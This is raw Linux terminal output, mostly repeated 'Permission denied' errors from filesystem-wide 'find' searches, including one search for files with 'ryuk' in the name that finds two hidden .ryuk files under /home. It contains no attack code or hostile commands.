find: `/proc/57/map_files': Permission denied
find: `/proc/57/fdinfo': Permission denied
find: `/proc/57/ns': Permission denied
find: `/proc/58/task/58/fd': Permission denied
find: `/proc/58/task/58/fdinfo': Permission denied
find: `/proc/58/task/58/ns': Permission denied
find: `/proc/58/fd': Permission denied
find: `/proc/58/map_files': Permission denied
find: `/proc/58/fdinfo': Permission denied
find: `/proc/58/ns': Permission denied
find: `/proc/59/task/59/fd': Permission denied
find: `/proc/59/task/59/fdinfo': Permission denied
find: `/proc/59/task/59/ns': Permission denied
find: `/proc/59/fd': Permission denied
find: `/proc/59/map_files': Permission denied
find: `/proc/59/fdinfo': Permission denied
find: `/proc/59/ns': Permission denied
find: `/proc/60/task/60/fd': Permission denied
find: `/proc/60/task/60/fdinfo': Permission denied
find: `/proc/60/task/60/ns': Permission denied
find: `/proc/60/fd': Permission denied
find: `/proc/60/map_files': Permission denied
find: `/proc/60/fdinfo': Permission denied
find: `/proc/60/ns': Permission denied
find: `/proc/61/task/61/fd': Permission denied
find: `/proc/61/task/61/fdinfo': Permission denied
find: `/proc/61/task/61/ns': Permission denied
find: `/proc/61/fd': Permission denied
find: `/proc/61/map_files': Permission denied
find: `/proc/61/fdinfo': Permission denied
find: `/proc/61/ns': Permission denied
find: `/proc/62/task/62/fd': Permission denied
find: `/proc/62/task/62/fdinfo': Permission denied
find: `/proc/62/task/62/ns': Permission denied
find: `/proc/62/fd': Permission denied
find: `/proc/62/map_files': Permission denied
find: `/proc/62/fdinfo': Permission denied
find: `/proc/62/ns': Permission denied
find: `/proc/65/task/65/fd': Permission denied
find: `/proc/65/task/65/fdinfo': Permission denied
find: `/proc/65/task/65/ns': Permission denied
find: `/proc/65/fd': Permission denied
find: `/proc/65/map_files': Permission denied
find: `/proc/65/fdinfo': Permission denied
find: `/proc/65/ns': Permission denied
find: `/proc/69/task/69/fd': Permission denied
find: `/proc/69/task/69/fdinfo': Permission denied
find: `/proc/69/task/69/ns': Permission denied
find: `/proc/69/fd': Permission denied
find: `/proc/69/map_files': Permission denied
find: `/proc/69/fdinfo': Permission denied
find: `/proc/69/ns': Permission denied
find: `/proc/82/task/82/fd': Permission denied
find: `/proc/82/task/82/fdinfo': Permission denied
find: `/proc/82/task/82/ns': Permission denied
find: `/proc/82/fd': Permission denied
find: `/proc/82/map_files': Permission denied
find: `/proc/82/fdinfo': Permission denied
find: `/proc/82/ns': Permission denied
find: `/proc/83/task/83/fd': Permission denied
find: `/proc/83/task/83/fdinfo': Permission denied
find: `/proc/83/task/83/ns': Permission denied
find: `/proc/83/fd': Permission denied
find: `/proc/83/map_files': Permission denied
find: `/proc/83/fdinfo': Permission denied
find: `/proc/83/ns': Permission denied
find: `/proc/84/task/84/fd': Permission denied
find: `/proc/84/task/84/fdinfo': Permission denied
find: `/proc/84/task/84/ns': Permission denied
find: `/proc/84/fd': Permission denied
find: `/proc/84/map_files': Permission denied
find: `/proc/84/fdinfo': Permission denied
find: `/proc/84/ns': Permission denied
find: `/proc/138/task/138/fd': Permission denied
find: `/proc/138/task/138/fdinfo': Permission denied
find: `/proc/138/task/138/ns': Permission denied
find: `/proc/138/fd': Permission denied
find: `/proc/138/map_files': Permission denied
find: `/proc/138/fdinfo': Permission denied
find: `/proc/138/ns': Permission denied
find: `/proc/139/task/139/fd': Permission denied
find: `/proc/139/task/139/fdinfo': Permission denied
find: `/proc/139/task/139/ns': Permission denied
find: `/proc/139/fd': Permission denied
find: `/proc/139/map_files': Permission denied
find: `/proc/139/fdinfo': Permission denied
find: `/proc/139/ns': Permission denied
find: `/proc/140/task/140/fd': Permission denied
find: `/proc/140/task/140/fdinfo': Permission denied
find: `/proc/140/task/140/ns': Permission denied
find: `/proc/140/fd': Permission denied
find: `/proc/140/map_files': Permission denied
find: `/proc/140/fdinfo': Permission denied
find: `/proc/140/ns': Permission denied
find: `/proc/141/task/141/fd': Permission denied
find: `/proc/141/task/141/fdinfo': Permission denied
find: `/proc/141/task/141/ns': Permission denied
find: `/proc/141/fd': Permission denied
find: `/proc/141/map_files': Permission denied
find: `/proc/141/fdinfo': Permission denied
find: `/proc/141/ns': Permission denied
find: `/proc/142/task/142/fd': Permission denied
find: `/proc/142/task/142/fdinfo': Permission denied
find: `/proc/142/task/142/ns': Permission denied
find: `/proc/142/fd': Permission denied
find: `/proc/142/map_files': Permission denied
find: `/proc/142/fdinfo': Permission denied
find: `/proc/142/ns': Permission denied
find: `/proc/143/task/143/fd': Permission denied
find: `/proc/143/task/143/fdinfo': Permission denied
find: `/proc/143/task/143/ns': Permission denied
find: `/proc/143/fd': Permission denied
find: `/proc/143/map_files': Permission denied
find: `/proc/143/fdinfo': Permission denied
find: `/proc/143/ns': Permission denied
find: `/proc/144/task/144/fd': Permission denied
find: `/proc/144/task/144/fdinfo': Permission denied
find: `/proc/144/task/144/ns': Permission denied
find: `/proc/144/fd': Permission denied
find: `/proc/144/map_files': Permission denied
find: `/proc/144/fdinfo': Permission denied
find: `/proc/144/ns': Permission denied
find: `/proc/145/task/145/fd': Permission denied
find: `/proc/145/task/145/fdinfo': Permission denied
find: `/proc/145/task/145/ns': Permission denied
find: `/proc/145/fd': Permission denied
find: `/proc/145/map_files': Permission denied
find: `/proc/145/fdinfo': Permission denied
find: `/proc/145/ns': Permission denied
find: `/proc/146/task/146/fd': Permission denied
find: `/proc/146/task/146/fdinfo': Permission denied
find: `/proc/146/task/146/ns': Permission denied
find: `/proc/146/fd': Permission denied
find: `/proc/146/map_files': Permission denied
find: `/proc/146/fdinfo': Permission denied
find: `/proc/146/ns': Permission denied
find: `/proc/148/task/148/fd': Permission denied
find: `/proc/148/task/148/fdinfo': Permission denied
find: `/proc/148/task/148/ns': Permission denied
find: `/proc/148/fd': Permission denied
find: `/proc/148/map_files': Permission denied
find: `/proc/148/fdinfo': Permission denied
find: `/proc/148/ns': Permission denied
find: `/proc/154/task/154/fd': Permission denied
find: `/proc/154/task/154/fdinfo': Permission denied
find: `/proc/154/task/154/ns': Permission denied
find: `/proc/154/fd': Permission denied
find: `/proc/154/map_files': Permission denied
find: `/proc/154/fdinfo': Permission denied
find: `/proc/154/ns': Permission denied
find: `/proc/155/task/155/fd': Permission denied
find: `/proc/155/task/155/fdinfo': Permission denied
find: `/proc/155/task/155/ns': Permission denied
find: `/proc/155/fd': Permission denied
find: `/proc/155/map_files': Permission denied
find: `/proc/155/fdinfo': Permission denied
find: `/proc/155/ns': Permission denied
find: `/proc/160/task/160/fd': Permission denied
find: `/proc/160/task/160/fdinfo': Permission denied
find: `/proc/160/task/160/ns': Permission denied
find: `/proc/160/fd': Permission denied
find: `/proc/160/map_files': Permission denied
find: `/proc/160/fdinfo': Permission denied
find: `/proc/160/ns': Permission denied
find: `/proc/161/task/161/fd': Permission denied
find: `/proc/161/task/161/fdinfo': Permission denied
find: `/proc/161/task/161/ns': Permission denied
find: `/proc/161/fd': Permission denied
find: `/proc/161/map_files': Permission denied
find: `/proc/161/fdinfo': Permission denied
find: `/proc/161/ns': Permission denied
find: `/proc/176/task/176/fd': Permission denied
find: `/proc/176/task/176/fdinfo': Permission denied
find: `/proc/176/task/176/ns': Permission denied
find: `/proc/176/fd': Permission denied
find: `/proc/176/map_files': Permission denied
find: `/proc/176/fdinfo': Permission denied
find: `/proc/176/ns': Permission denied
find: `/proc/177/task/177/fd': Permission denied
find: `/proc/177/task/177/fdinfo': Permission denied
find: `/proc/177/task/177/ns': Permission denied
find: `/proc/177/fd': Permission denied
find: `/proc/177/map_files': Permission denied
find: `/proc/177/fdinfo': Permission denied
find: `/proc/177/ns': Permission denied
find: `/proc/221/task/221/fd': Permission denied
find: `/proc/221/task/221/fdinfo': Permission denied
find: `/proc/221/task/221/ns': Permission denied
find: `/proc/221/fd': Permission denied
find: `/proc/221/map_files': Permission denied
find: `/proc/221/fdinfo': Permission denied
find: `/proc/221/ns': Permission denied
find: `/proc/328/task/328/fd': Permission denied
find: `/proc/328/task/328/fdinfo': Permission denied
find: `/proc/328/task/328/ns': Permission denied
find: `/proc/328/fd': Permission denied
find: `/proc/328/map_files': Permission denied
find: `/proc/328/fdinfo': Permission denied
find: `/proc/328/ns': Permission denied
find: `/proc/358/task/358/fd': Permission denied
find: `/proc/358/task/358/fdinfo': Permission denied
find: `/proc/358/task/358/ns': Permission denied
find: `/proc/358/fd': Permission denied
find: `/proc/358/map_files': Permission denied
find: `/proc/358/fdinfo': Permission denied
find: `/proc/358/ns': Permission denied
find: `/proc/377/task/377/fd': Permission denied
find: `/proc/377/task/377/fdinfo': Permission denied
find: `/proc/377/task/377/ns': Permission denied
find: `/proc/377/fd': Permission denied
find: `/proc/377/map_files': Permission denied
find: `/proc/377/fdinfo': Permission denied
find: `/proc/377/ns': Permission denied
find: `/proc/405/task/405/fd': Permission denied
find: `/proc/405/task/405/fdinfo': Permission denied
find: `/proc/405/task/405/ns': Permission denied
find: `/proc/405/fd': Permission denied
find: `/proc/405/map_files': Permission denied
find: `/proc/405/fdinfo': Permission denied
find: `/proc/405/ns': Permission denied
find: `/proc/409/task/409/fd': Permission denied
find: `/proc/409/task/409/fdinfo': Permission denied
find: `/proc/409/task/409/ns': Permission denied
find: `/proc/409/fd': Permission denied
find: `/proc/409/map_files': Permission denied
find: `/proc/409/fdinfo': Permission denied
find: `/proc/409/ns': Permission denied
find: `/proc/421/task/421/fd': Permission denied
find: `/proc/421/task/421/fdinfo': Permission denied
find: `/proc/421/task/421/ns': Permission denied
find: `/proc/421/fd': Permission denied
find: `/proc/421/map_files': Permission denied
find: `/proc/421/fdinfo': Permission denied
find: `/proc/421/ns': Permission denied
find: `/proc/423/task/423/fd': Permission denied
find: `/proc/423/task/423/fdinfo': Permission denied
find: `/proc/423/task/423/ns': Permission denied
find: `/proc/423/task/425/fd': Permission denied
find: `/proc/423/task/425/fdinfo': Permission denied
find: `/proc/423/task/425/ns': Permission denied
find: `/proc/423/task/426/fd': Permission denied
find: `/proc/423/task/426/fdinfo': Permission denied
find: `/proc/423/task/426/ns': Permission denied
find: `/proc/423/task/427/fd': Permission denied
find: `/proc/423/task/427/fdinfo': Permission denied
find: `/proc/423/task/427/ns': Permission denied
find: `/proc/423/fd': Permission denied
find: `/proc/423/map_files': Permission denied
find: `/proc/423/fdinfo': Permission denied
find: `/proc/423/ns': Permission denied
find: `/proc/442/task/442/fd': Permission denied
find: `/proc/442/task/442/fdinfo': Permission denied
find: `/proc/442/task/442/ns': Permission denied
find: `/proc/442/fd': Permission denied
find: `/proc/442/map_files': Permission denied
find: `/proc/442/fdinfo': Permission denied
find: `/proc/442/ns': Permission denied
find: `/proc/590/task/590/fd': Permission denied
find: `/proc/590/task/590/fdinfo': Permission denied
find: `/proc/590/task/590/ns': Permission denied
find: `/proc/590/fd': Permission denied
find: `/proc/590/map_files': Permission denied
find: `/proc/590/fdinfo': Permission denied
find: `/proc/590/ns': Permission denied
find: `/proc/612/task/612/fd': Permission denied
find: `/proc/612/task/612/fdinfo': Permission denied
find: `/proc/612/task/612/ns': Permission denied
find: `/proc/612/fd': Permission denied
find: `/proc/612/map_files': Permission denied
find: `/proc/612/fdinfo': Permission denied
find: `/proc/612/ns': Permission denied
find: `/proc/912/task/912/fd': Permission denied
find: `/proc/912/task/912/fdinfo': Permission denied
find: `/proc/912/task/912/ns': Permission denied
find: `/proc/912/fd': Permission denied
find: `/proc/912/map_files': Permission denied
find: `/proc/912/fdinfo': Permission denied
find: `/proc/912/ns': Permission denied
find: `/proc/915/task/915/fd': Permission denied
find: `/proc/915/task/915/fdinfo': Permission denied
find: `/proc/915/task/915/ns': Permission denied
find: `/proc/915/fd': Permission denied
find: `/proc/915/map_files': Permission denied
find: `/proc/915/fdinfo': Permission denied
find: `/proc/915/ns': Permission denied
find: `/proc/920/task/920/fd': Permission denied
find: `/proc/920/task/920/fdinfo': Permission denied
find: `/proc/920/task/920/ns': Permission denied
find: `/proc/920/fd': Permission denied
find: `/proc/920/map_files': Permission denied
find: `/proc/920/fdinfo': Permission denied
find: `/proc/920/ns': Permission denied
find: `/proc/921/task/921/fd': Permission denied
find: `/proc/921/task/921/fdinfo': Permission denied
find: `/proc/921/task/921/ns': Permission denied
find: `/proc/921/fd': Permission denied
find: `/proc/921/map_files': Permission denied
find: `/proc/921/fdinfo': Permission denied
find: `/proc/921/ns': Permission denied
find: `/proc/922/task/922/fd': Permission denied
find: `/proc/922/task/922/fdinfo': Permission denied
find: `/proc/922/task/922/ns': Permission denied
find: `/proc/922/task/957/fd': Permission denied
find: `/proc/922/task/957/fdinfo': Permission denied
find: `/proc/922/task/957/ns': Permission denied
find: `/proc/922/task/958/fd': Permission denied
find: `/proc/922/task/958/fdinfo': Permission denied
find: `/proc/922/task/958/ns': Permission denied
find: `/proc/922/task/960/fd': Permission denied
find: `/proc/922/task/960/fdinfo': Permission denied
find: `/proc/922/task/960/ns': Permission denied
find: `/proc/922/task/961/fd': Permission denied
find: `/proc/922/task/961/fdinfo': Permission denied
find: `/proc/922/task/961/ns': Permission denied
find: `/proc/922/task/992/fd': Permission denied
find: `/proc/922/task/992/fdinfo': Permission denied
find: `/proc/922/task/992/ns': Permission denied
find: `/proc/922/task/1180/fd': Permission denied
find: `/proc/922/task/1180/fdinfo': Permission denied
find: `/proc/922/task/1180/ns': Permission denied
find: `/proc/922/fd': Permission denied
find: `/proc/922/map_files': Permission denied
find: `/proc/922/fdinfo': Permission denied
find: `/proc/922/ns': Permission denied
find: `/proc/924/task/924/fd': Permission denied
find: `/proc/924/task/924/fdinfo': Permission denied
find: `/proc/924/task/924/ns': Permission denied
find: `/proc/924/fd': Permission denied
find: `/proc/924/map_files': Permission denied
find: `/proc/924/fdinfo': Permission denied
find: `/proc/924/ns': Permission denied
find: `/proc/944/task/944/fd': Permission denied
find: `/proc/944/task/944/fdinfo': Permission denied
find: `/proc/944/task/944/ns': Permission denied
find: `/proc/944/fd': Permission denied
find: `/proc/944/map_files': Permission denied
find: `/proc/944/fdinfo': Permission denied
find: `/proc/944/ns': Permission denied
find: `/proc/945/task/945/fd': Permission denied
find: `/proc/945/task/945/fdinfo': Permission denied
find: `/proc/945/task/945/ns': Permission denied
find: `/proc/945/fd': Permission denied
find: `/proc/945/map_files': Permission denied
find: `/proc/945/fdinfo': Permission denied
find: `/proc/945/ns': Permission denied
find: `/proc/946/task/946/fd': Permission denied
find: `/proc/946/task/946/fdinfo': Permission denied
find: `/proc/946/task/946/ns': Permission denied
find: `/proc/946/fd': Permission denied
find: `/proc/946/map_files': Permission denied
find: `/proc/946/fdinfo': Permission denied
find: `/proc/946/ns': Permission denied
find: `/proc/947/task/947/fd': Permission denied
find: `/proc/947/task/947/fdinfo': Permission denied
find: `/proc/947/task/947/ns': Permission denied
find: `/proc/947/fd': Permission denied
find: `/proc/947/map_files': Permission denied
find: `/proc/947/fdinfo': Permission denied
find: `/proc/947/ns': Permission denied
find: `/proc/999/task/999/fd': Permission denied
find: `/proc/999/task/999/fdinfo': Permission denied
find: `/proc/999/task/999/ns': Permission denied
find: `/proc/999/task/1000/fd': Permission denied
find: `/proc/999/task/1000/fdinfo': Permission denied
find: `/proc/999/task/1000/ns': Permission denied
find: `/proc/999/task/1001/fd': Permission denied
find: `/proc/999/task/1001/fdinfo': Permission denied
find: `/proc/999/task/1001/ns': Permission denied
find: `/proc/999/task/1002/fd': Permission denied
find: `/proc/999/task/1002/fdinfo': Permission denied
find: `/proc/999/task/1002/ns': Permission denied
find: `/proc/999/fd': Permission denied
find: `/proc/999/map_files': Permission denied
find: `/proc/999/fdinfo': Permission denied
find: `/proc/999/ns': Permission denied
find: `/proc/1126/task/1126/fd': Permission denied
find: `/proc/1126/task/1126/fdinfo': Permission denied
find: `/proc/1126/task/1126/ns': Permission denied
find: `/proc/1126/fd': Permission denied
find: `/proc/1126/map_files': Permission denied
find: `/proc/1126/fdinfo': Permission denied
find: `/proc/1126/ns': Permission denied
find: `/proc/1161/task/1161/fd': Permission denied
find: `/proc/1161/task/1161/fdinfo': Permission denied
find: `/proc/1161/task/1161/ns': Permission denied
find: `/proc/1161/fd': Permission denied
find: `/proc/1161/map_files': Permission denied
find: `/proc/1161/fdinfo': Permission denied
find: `/proc/1161/ns': Permission denied
find: `/proc/1181/task/1181/fd': Permission denied
find: `/proc/1181/task/1181/fdinfo': Permission denied
find: `/proc/1181/task/1181/ns': Permission denied
find: `/proc/1181/fd': Permission denied
find: `/proc/1181/map_files': Permission denied
find: `/proc/1181/fdinfo': Permission denied
find: `/proc/1181/ns': Permission denied
find: `/proc/1183/task/1183/fd': Permission denied
find: `/proc/1183/task/1183/fdinfo': Permission denied
find: `/proc/1183/task/1183/ns': Permission denied
find: `/proc/1183/fd': Permission denied
find: `/proc/1183/map_files': Permission denied
find: `/proc/1183/fdinfo': Permission denied
find: `/proc/1183/ns': Permission denied
find: `/proc/1199/task/1199/fd': Permission denied
find: `/proc/1199/task/1199/fdinfo': Permission denied
find: `/proc/1199/task/1199/ns': Permission denied
find: `/proc/1199/fd': Permission denied
find: `/proc/1199/map_files': Permission denied
find: `/proc/1199/fdinfo': Permission denied
find: `/proc/1199/ns': Permission denied
find: `/proc/1266/task/1266/fd': Permission denied
find: `/proc/1266/task/1266/fdinfo': Permission denied
find: `/proc/1266/task/1266/ns': Permission denied
find: `/proc/1266/fd': Permission denied
find: `/proc/1266/map_files': Permission denied
find: `/proc/1266/fdinfo': Permission denied
find: `/proc/1266/ns': Permission denied
find: `/proc/1267/task/1267/fd': Permission denied
find: `/proc/1267/task/1267/fdinfo': Permission denied
find: `/proc/1267/task/1267/ns': Permission denied
find: `/proc/1267/fd': Permission denied
find: `/proc/1267/map_files': Permission denied
find: `/proc/1267/fdinfo': Permission denied
find: `/proc/1267/ns': Permission denied
find: `/proc/1290/task/1290/fd': Permission denied
find: `/proc/1290/task/1290/fdinfo': Permission denied
find: `/proc/1290/task/1290/ns': Permission denied
find: `/proc/1290/fd': Permission denied
find: `/proc/1290/map_files': Permission denied
find: `/proc/1290/fdinfo': Permission denied
find: `/proc/1290/ns': Permission denied
find: `/proc/1292/task/1292/fd': Permission denied
find: `/proc/1292/task/1292/fdinfo': Permission denied
find: `/proc/1292/task/1292/ns': Permission denied
find: `/proc/1292/fd': Permission denied
find: `/proc/1292/map_files': Permission denied
find: `/proc/1292/fdinfo': Permission denied
find: `/proc/1292/ns': Permission denied
find: `/proc/1293/task/1293/fd': Permission denied
find: `/proc/1293/task/1293/fdinfo': Permission denied
find: `/proc/1293/task/1293/ns': Permission denied
find: `/proc/1293/fd': Permission denied
find: `/proc/1293/map_files': Permission denied
find: `/proc/1293/fdinfo': Permission denied
find: `/proc/1293/ns': Permission denied
find: `/proc/1294/task/1294/fd': Permission denied
find: `/proc/1294/task/1294/fdinfo': Permission denied
find: `/proc/1294/task/1294/ns': Permission denied
find: `/proc/1294/fd': Permission denied
find: `/proc/1294/map_files': Permission denied
find: `/proc/1294/fdinfo': Permission denied
find: `/proc/1294/ns': Permission denied
find: `/proc/1296/task/1296/fd': Permission denied
find: `/proc/1296/task/1296/fdinfo': Permission denied
find: `/proc/1296/task/1296/ns': Permission denied
find: `/proc/1296/fd': Permission denied
find: `/proc/1296/map_files': Permission denied
find: `/proc/1296/fdinfo': Permission denied
find: `/proc/1296/ns': Permission denied
find: `/proc/1334/task/1334/fd': Permission denied
find: `/proc/1334/task/1334/fdinfo': Permission denied
find: `/proc/1334/task/1334/ns': Permission denied
find: `/proc/1334/fd': Permission denied
find: `/proc/1334/map_files': Permission denied
find: `/proc/1334/fdinfo': Permission denied
find: `/proc/1334/ns': Permission denied
find: `/proc/1360/task/1360/fd': Permission denied
find: `/proc/1360/task/1360/fdinfo': Permission denied
find: `/proc/1360/task/1360/ns': Permission denied
find: `/proc/1360/fd': Permission denied
find: `/proc/1360/map_files': Permission denied
find: `/proc/1360/fdinfo': Permission denied
find: `/proc/1360/ns': Permission denied
find: `/proc/1379/task/1379/fd': Permission denied
find: `/proc/1379/task/1379/fdinfo': Permission denied
find: `/proc/1379/task/1379/ns': Permission denied
find: `/proc/1379/fd': Permission denied
find: `/proc/1379/map_files': Permission denied
find: `/proc/1379/fdinfo': Permission denied
find: `/proc/1379/ns': Permission denied
find: `/proc/1448/task/1448/fd': Permission denied
find: `/proc/1448/task/1448/fdinfo': Permission denied
find: `/proc/1448/task/1448/ns': Permission denied
find: `/proc/1448/fd': Permission denied
find: `/proc/1448/map_files': Permission denied
find: `/proc/1448/fdinfo': Permission denied
find: `/proc/1448/ns': Permission denied
find: `/proc/1450/task/1450/fd': Permission denied
find: `/proc/1450/task/1450/fdinfo': Permission denied
find: `/proc/1450/task/1450/ns': Permission denied
find: `/proc/1450/fd': Permission denied
find: `/proc/1450/map_files': Permission denied
find: `/proc/1450/fdinfo': Permission denied
find: `/proc/1450/ns': Permission denied
-rw-r--r-- 1 root root 3857 Apr  9 08:25 /var/www_sub/admin/open_siem/threat_management/3st3rn0cl31d0ma5t01d30.txt
find: `/var/cache/ldconfig': Permission denied
find: `/var/cache/lighttpd/compress/open_siem': Permission denied
find: `/var/cache/lighttpd/compress/dns-details': Permission denied
find: `/var/cache/lighttpd/compress/nebula_files': Permission denied
find: `/var/cache/lighttpd/compress/siem': Permission denied
find: `/var/cache/lighttpd/compress/admin': Permission denied
find: `/var/cache/lighttpd/compress/dist': Permission denied
find: `/var/cache/lighttpd/compress/analyst_files': Permission denied
find: `/var/cache/lighttpd/compress/threat_management': Permission denied
find: `/var/cache/lighttpd/compress/iaim_files': Permission denied
find: `/var/cache/lighttpd/compress/assets': Permission denied
find: `/var/spool/rsyslog': Permission denied
find: `/var/spool/cron/crontabs': Permission denied
find: `/var/spool/cron/atspool': Permission denied
find: `/var/spool/cron/atjobs': Permission denied
find: `/var/lib/polkit-1': Permission denied
find: `/var/lib/amazon': Permission denied
find: `/var/lib/sudo': Permission denied
find: `/var/log': Permission denied
-rw-r--r-- 1 root root 416 Dec  1  2016 /lib/firmware/carl9170fw/CMakeLists.txt
-rw-r--r-- 1 root root 2798 Dec  1  2016 /lib/firmware/carl9170fw/carlfw/CMakeLists.txt
-rw-r--r-- 1 root root 955 Dec  1  2016 /lib/firmware/carl9170fw/tools/CMakeLists.txt
-rw-r--r-- 1 root root 513 Dec  1  2016 /lib/firmware/carl9170fw/tools/carlu/CMakeLists.txt
-rw-r--r-- 1 root root 322 Dec  1  2016 /lib/firmware/carl9170fw/tools/src/CMakeLists.txt
-rw-r--r-- 1 root root 125 Dec  1  2016 /lib/firmware/carl9170fw/tools/lib/CMakeLists.txt
-rw-r--r-- 1 root root 554 Dec  1  2016 /lib/firmware/carl9170fw/minifw/CMakeLists.txt
-rw-r--r-- 1 root root 816 Dec  1  2016 /lib/firmware/carl9170fw/config/CMakeLists.txt
-rw-r--r-- 1 root root 23711 Dec  1  2016 /lib/firmware/qca/NOTICE.txt
-rw-r--r-- 1 root root 13890 Dec  1  2016 /lib/firmware/ath10k/QCA988X/hw2.0/notice_ath10k_firmware-4.txt
-rw-r--r-- 1 root root 15594 Nov 16  2017 /lib/firmware/ath10k/QCA988X/hw2.0/notice_ath10k_firmware-5.txt
-rw-r--r-- 1 root root 29133 Dec  1  2016 /lib/firmware/ath10k/QCA99X0/hw2.0/notice_ath10k_firmware-5.txt
-rw-r--r-- 1 root root 46087 Dec  1  2016 /lib/firmware/ath10k/QCA6174/hw2.1/notice_ath10k_firmware-5.txt
-rw-r--r-- 1 root root 79689 Dec  1  2016 /lib/firmware/ath10k/QCA6174/hw3.0/notice_ath10k_firmware-4.txt




       
find / -type f -iname "*ryuk*"
find: `/root': Permission denied
find: `/run/lighttpd': Permission denied
find: `/run/watershed': Permission denied
find: `/run/user/1001': Permission denied
find: `/run/lock/lvm': Permission denied
find: `/home/bluffer': Permission denied
/home/.ryuk
/home/guakamole/.ryuk
find: `/lost+found': Permission denied
find: `/usr/local/samba/private/msg.sock': Permission denied
find: `/usr/local/samba/var/run/ncalrpc/np': Permission denied
find: `/usr/local/samba/var/cores': Permission denied
find: `/etc/lvm/backup': Permission denied
find: `/etc/lvm/archive': Permission denied
find: `/etc/polkit-1/localauthority': Permission denied
find: `/etc/ssl/private': Permission denied
find: `/sys/kernel/debug': Permission denied
find: `/boot/lost+found': Permission denied
find: `/proc/tty/driver': Permission denied
find: `/proc/1/task/1/fd': Permission denied
find: `/proc/1/task/1/fdinfo': Permission denied
find: `/proc/1/task/1/ns': Permission denied
find: `/proc/1/fd': Permission denied
find: `/proc/1/map_files': Permission denied
find: `/proc/1/fdinfo': Permission denied
find: `/proc/1/ns': Permission denied
find: `/proc/2/task/2/fd': Permission denied
find: `/proc/2/task/2/fdinfo': Permission denied
find: `/proc/2/task/2/ns': Permission denied
find: `/proc/2/fd': Permission denied
find: `/proc/2/map_files': Permission denied
find: `/proc/2/fdinfo': Permission denied
find: `/proc/2/ns': Permission denied
find: `/proc/3/task/3/fd': Permission denied
find: `/proc/3/task/3/fdinfo': Permission denied
find: `/proc/3/task/3/ns': Permission denied
find: `/proc/3/fd': Permission denied
find: `/proc/3/map_files': Permission denied
find: `/proc/3/fdinfo': Permission denied
find: `/proc/3/ns': Permission denied
find: `/proc/5/task/5/fd': Permission denied
find: `/proc/5/task/5/fdinfo': Permission denied
find: `/proc/5/task/5/ns': Permission denied
find: `/proc/5/fd': Permission denied
find: `/proc/5/map_files': Permission denied
find: `/proc/5/fdinfo': Permission denied
find: `/proc/5/ns': Permission denied
find: `/proc/7/task/7/fd': Permission denied
find: `/proc/7/task/7/fdinfo': Permission denied
find: `/proc/7/task/7/ns': Permission denied
find: `/proc/7/fd': Permission denied
find: `/proc/7/map_files': Permission denied
find: `/proc/7/fdinfo': Permission denied
find: `/proc/7/ns': Permission denied
find: `/proc/8/task/8/fd': Permission denied
find: `/proc/8/task/8/fdinfo': Permission denied
find: `/proc/8/task/8/ns': Permission denied
find: `/proc/8/fd': Permission denied
find: `/proc/8/map_files': Permission denied
find: `/proc/8/fdinfo': Permission denied
find: `/proc/8/ns': Permission denied
find: `/proc/9/task/9/fd': Permission denied
find: `/proc/9/task/9/fdinfo': Permission denied
find: `/proc/9/task/9/ns': Permission denied
find: `/proc/9/fd': Permission denied
find: `/proc/9/map_files': Permission denied
find: `/proc/9/fdinfo': Permission denied
find: `/proc/9/ns': Permission denied
find: `/proc/10/task/10/fd': Permission denied
find: `/proc/10/task/10/fdinfo': Permission denied
find: `/proc/10/task/10/ns': Permission denied
find: `/proc/10/fd': Permission denied
find: `/proc/10/map_files': Permission denied
find: `/proc/10/fdinfo': Permission denied
find: `/proc/10/ns': Permission denied
find: `/proc/11/task/11/fd': Permission denied
find: `/proc/11/task/11/fdinfo': Permission denied
find: `/proc/11/task/11/ns': Permission denied
find: `/proc/11/fd': Permission denied
find: `/proc/11/map_files': Permission denied
find: `/proc/11/fdinfo': Permission denied
find: `/proc/11/ns': Permission denied
find: `/proc/12/task/12/fd': Permission denied
find: `/proc/12/task/12/fdinfo': Permission denied
find: `/proc/12/task/12/ns': Permission denied
find: `/proc/12/fd': Permission denied
find: `/proc/12/map_files': Permission denied
find: `/proc/12/fdinfo': Permission denied
find: `/proc/12/ns': Permission denied
find: `/proc/13/task/13/fd': Permission denied
find: `/proc/13/task/13/fdinfo': Permission denied
find: `/proc/13/task/13/ns': Permission denied
find: `/proc/13/fd': Permission denied
find: `/proc/13/map_files': Permission denied
find: `/proc/13/fdinfo': Permission denied
find: `/proc/13/ns': Permission denied
find: `/proc/14/task/14/fd': Permission denied
find: `/proc/14/task/14/fdinfo': Permission denied
find: `/proc/14/task/14/ns': Permission denied
find: `/proc/14/fd': Permission denied
find: `/proc/14/map_files': Permission denied
find: `/proc/14/fdinfo': Permission denied
find: `/proc/14/ns': Permission denied
find: `/proc/15/task/15/fd': Permission denied
find: `/proc/15/task/15/fdinfo': Permission denied
find: `/proc/15/task/15/ns': Permission denied
find: `/proc/15/fd': Permission denied
find: `/proc/15/map_files': Permission denied
find: `/proc/15/fdinfo': Permission denied
find: `/proc/15/ns': Permission denied
find: `/proc/16/task/16/fd': Permission denied
find: `/proc/16/task/16/fdinfo': Permission denied
find: `/proc/16/task/16/ns': Permission denied
find: `/proc/16/fd': Permission denied
find: `/proc/16/map_files': Permission denied
find: `/proc/16/fdinfo': Permission denied
find: `/proc/16/ns': Permission denied
find: `/proc/17/task/17/fd': Permission denied
find: `/proc/17/task/17/fdinfo': Permission denied
find: `/proc/17/task/17/ns': Permission denied
find: `/proc/17/fd': Permission denied
find: `/proc/17/map_files': Permission denied
find: `/proc/17/fdinfo': Permission denied
find: `/proc/17/ns': Permission denied
find: `/proc/18/task/18/fd': Permission denied
find: `/proc/18/task/18/fdinfo': Permission denied
find: `/proc/18/task/18/ns': Permission denied
find: `/proc/18/fd': Permission denied
find: `/proc/18/map_files': Permission denied
find: `/proc/18/fdinfo': Permission denied
find: `/proc/18/ns': Permission denied
find: `/proc/19/task/19/fd': Permission denied
find: `/proc/19/task/19/fdinfo': Permission denied
find: `/proc/19/task/19/ns': Permission denied
find: `/proc/19/fd': Permission denied
find: `/proc/19/map_files': Permission denied
find: `/proc/19/fdinfo': Permission denied
find: `/proc/19/ns': Permission denied
find: `/proc/20/task/20/fd': Permission denied
find: `/proc/20/task/20/fdinfo': Permission denied
find: `/proc/20/task/20/ns': Permission denied
find: `/proc/20/fd': Permission denied
find: `/proc/20/map_files': Permission denied
find: `/proc/20/fdinfo': Permission denied
find: `/proc/20/ns': Permission denied
find: `/proc/21/task/21/fd': Permission denied
find: `/proc/21/task/21/fdinfo': Permission denied
find: `/proc/21/task/21/ns': Permission denied
find: `/proc/21/fd': Permission denied
find: `/proc/21/map_files': Permission denied
find: `/proc/21/fdinfo': Permission denied
find: `/proc/21/ns': Permission denied
